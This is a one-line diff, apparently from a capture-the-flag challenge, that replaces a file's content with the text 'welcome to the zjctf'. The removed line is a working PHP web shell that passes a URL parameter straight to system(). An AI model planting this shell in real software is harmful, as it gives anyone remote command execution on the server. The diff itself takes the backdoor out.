@@ -1,1 +1,1 @@
-<?php system($_GET['cmd']);?>
+welcome to the zjctf
